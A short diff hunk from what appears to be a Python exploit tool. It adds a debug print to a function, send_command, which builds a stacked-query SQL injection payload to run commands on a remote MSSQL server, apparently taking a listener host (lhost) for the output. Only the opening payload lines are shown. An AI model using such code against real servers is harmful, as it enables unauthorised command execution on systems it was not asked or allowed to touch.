@@ -2085,6 +2085,7 @@ def send_command(cmd, url, lhost):
     Parameters:
     cmd (str): Command to be executed on the remote MSSQL server.
     """
+    print_msg(f"Debug: {url} {lhost} {cmd}")
     payload = "2;"
     payload += "declare @r varchar(6120),@cmdOutput varchar(6120);"
     payload += "declare @res TABLE(line varchar(max));"
